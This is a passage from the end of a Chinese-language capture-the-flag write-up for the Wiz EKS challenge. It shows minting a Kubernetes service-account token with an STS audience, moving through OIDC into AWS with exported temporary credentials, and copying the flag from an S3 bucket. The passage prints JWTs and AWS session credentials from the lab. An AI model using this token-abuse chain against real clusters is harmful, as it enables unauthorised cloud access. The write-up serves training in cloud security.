eyJhbGciOiJSUzI1NiIsImtpZCI6IjE2NjQzOGRlMGNjNzk5OGMzODNlYWRmOTM4NmEzN2FhODBmODlkNGEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjIl0sImV4cCI6MTcwMzE0ODI4NywiaWF0IjoxNzAzMTQ0Njg3LCJpc3MiOiJodHRwczovL29pZGMuZWtzLnVzLXdlc3QtMS5hbWF6b25hd3MuY29tL2lkL0MwNjJDMjA3QzhGNTBERTRFQzI0QTM3MkZGNjBFNTg5Iiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjaGFsbGVuZ2U1Iiwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlYnVnLXNhIiwidWlkIjoiNmNiNjAyNGEtYzRkYS00N2E5LTkwNTAtNTljOGM3MDc5OTA0In19LCJuYmYiOjE3MDMxNDQ2ODcsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjaGFsbGVuZ2U1OmRlYnVnLXNhIn0.CDOjlkmZiKydGwzyd1LoF3eXSVLt10kV0LGLHHk9eXwEsvTd5nH7c_GyGlmucDRq0ovPAiA1v6RpaAGbF2DfkKJRL9RFPTxzkbbF1M4ub91uTBKVWvQtmFRdLi1iOC5r4Htdyse16gjkm-tgwkH86gjoJVWEYM5GlLyRkUfG84Sp7jhT1-urVVHtE56KQ4PsCKyyyVeEX4-BHqqprZ9ra2V4k5fATySHN07o3uBQz4QGPWCVaXeZ-PEPmB780Zb06SWssvGlNw2j8MKfKGVlkZtdhmnRvPjI2oDGsoeCaKbSIWXDcg1go5c9MEiXgY2-8mzsdGDxghQVERpeEkCj5A
```

[![](assets/1703209910-b8dac2ec31115caa34d7e5b5baec5f65.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165835-1faf07e2-9fdf-1.png)  
（图10：从debug-sa创建出来的token通过jwt解密发现有OIDC权限）

但是发现生成的Token并不能用于AWS，经过一番尝试发现需要加上参数`--audience sts.amazonaws.com`。

```plain
root@wiz-eks-challenge:~#  kubectl create token debug-sa --audience sts.amazonaws.com --token="省略"
eyJhbGciOiJSUzI1NiIsImtpZCI6IjE2NjQzOGRlMGNjNzk5OGMzODNlYWRmOTM4NmEzN2FhODBmODlkNGEifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXhwIjoxNzAzMTQ4ODIwLCJpYXQiOjE3MDMxNDUyMjAsImlzcyI6Imh0dHBzOi8vb2lkYy5la3MudXMtd2VzdC0xLmFtYXpvbmF3cy5jb20vaWQvQzA2MkMyMDdDOEY1MERFNEVDMjRBMzcyRkY2MEU1ODkiLCJrdWJlcm5ldGVzLmlvIjp7Im5hbWVzcGFjZSI6ImNoYWxsZW5nZTUiLCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVidWctc2EiLCJ1aWQiOiI2Y2I2MDI0YS1jNGRhLTQ3YTktOTA1MC01OWM4YzcwNzk5MDQifX0sIm5iZiI6MTcwMzE0NTIyMCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmNoYWxsZW5nZTU6ZGVidWctc2EifQ.tqwlsFNDlASHdd_ATTug57kHIuHzzmU9XkLUJ88cjpftY5FRgw6BxSI1Qx8AUSZbWcJvVjvHNdxfPOUgoLQHNR-9K1UG7Hkl-6z3Wd69xnfExQpYgoLZgGjyJZiA5WHX9qrAZCtPevyJUNqUadIi97Vh75y0zKeIFlwseQV_MnaZILtsc7M_iyBpypEtG23lGgZE6dCNxia225p0QXKQPnyQzIEjB84cEVJnQa739H-VeTZdwt7SOfD3-uMqnaoLfAKjImlf9Vz7L4Rr-5uWaE4nncMCFlTTBw3XbpGksS_CGs1Rsli-5NAOmGBR8jGnjSfpX5mGhhrn73EWfTyERg
```

[![](assets/1703209910-343c837d626b4de4fc0d6629384e9aa7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165845-25dc86e4-9fdf-1.png)  
（图11：重新生成的发现已经有了sts的权限）

[![](assets/1703209910-00d02db9729c69edc72a5b48a7b4a584.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165852-2a10d7ec-9fdf-1.png)  
（图12：成功获取AWS权限）

```plain
root@wiz-eks-challenge:~# export AWS_ACCESS_KEY_ID=ASIA2AVYNEVM4Z35S2XF
root@wiz-eks-challenge:~# export AWS_SECRET_ACCESS_KEY=BmwwpthMz2ivzM1yCkD0InVyUHoxYK09ojkOP7VD
export root@wiz-eks-challenge:~# AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEIj//////////wEaCXVzLXdlc3QtMSJHMEUCIQCWyMf4Dc3upbRIgmfGqYJSuj3mXU243dJEaxSNk/v+AQIgXKp74+fyaNLx/MIMZF3lIrN3WrpaYOQTpnhttN6YOz4qtgQIERAAGgw2ODg2NTUyNDY2ODEiDJgn3KRnm+MlHEVLUyqTBD5b7l11y4B6mYtJKxyvMnFkmhQviq5D/LwbcFEJS88MflU1LQcODdff58MyWh2J/842/hgm7ChxmK/JYlTOVCS8KaHtCQtva+4rfGqOkVgQVreCQeSgc+xfSrf292biZAL5W3dzI5eGeAy7wvQFilYj4DBNM+y/fxiaO1R4+qNSXushw86mTTyi3eKRG1BYZ9MX0flCmovPEHXmUYj0kZgAv/0Gixg552pP/9GRF3zR/nh6DZrGmfPVzUK8qQfNGsMxbXVuCU4iD38/zsY9rC+2PGehRodWaTKPjiv2tdXdJrP6eTCqsgQCtgRwL46CXozFtUMYd/Ud/epGiGt8I6BiWyFdfqsZrXjHaQg0QQlssmtJe7WLaYW4oOIik/jkK4yQWxRHSlJBrf/b/EHFPQfdzYxSINEKl+Tc4BKzJJzxPvxqXfGi91byeaxHJBfjXYbhqelXXeC848guWlkIa8nZp4F8J6YgaaCYtFnZwljD4nHbc97ydVfDsBoJEaLSlBv8Gskm8XkLTMckdlWJYqfLXdXaBUaDf8ceH0MQ/yrJ66LiSLBnSW9vF11kn1T1Uhbsk5iTFMfXrevzeN5J9u20aTyDqxs8JegwhQcka2r1qy2Fa9b3M0CgUirHZw/2I1XTL5G+mEDVQ0wuRmAT0SkW9MOcUPqq2opSU/cV5KILvH69ACIfrjtmA48uLnQsex1/wTDB6Y+sBjqVAbE/nF/w+6L+qrQXWt+SNcXV7u4ovIy2PGgTIdQotPUTCZSa6vwfohFFTdC91Stl/Wtpxw6nexTL7axTHQSmGMgaqDGOioF5DEp8LNYk6PUFFjwavUs2GX51YQpHL1lkh/jd5gbAyl0MDQbyukv1WVHYg8Y1a9Cm2Nd0aeyVAUJHjoOkg2kymCJPfIbQfr9fjkLl6+zV

aws s3 cp s3://challenge-flag-bucket-3ff1ae2/flag ./flag
```

[![](assets/1703209910-9db2087a8ed9589d759a85e9c9dc633c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165909-341b7e68-9fdf-1.png)  
（图13：成功获取Flag）

> wiz\_eks\_challenge{w0w\_y0u\_really\_are\_4n\_eks\_and\_aws\_exp1oitation\_legend}

[![](assets/1703209910-f8cde7729175ba31e34bb1e693d101be.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231221165941-46d8130e-9fdf-1.png)  
（图14：通关纪念）

## 后记

这五道题总体来说难度不是很高，Secret的不安全编码问题、imagePullSecrets的安全问题、集群权限策略过大问题、镜像构建时的信息安全、对元数据的利用、以及IAM策略安全，这些都是常见的云原生安全问题，并且都是常见场景，与其是考察云原生的攻击思路，倒不如说是考察信息获取，官方文档的理解能力，但这个靶场确是十分的精彩。从第一题最低的POD权限开始进行利用，然后一步步拿到Node权限，再到EKS权限，最终通过OIDC横向到AWS权限，环环相扣，能学到非常多的东西。
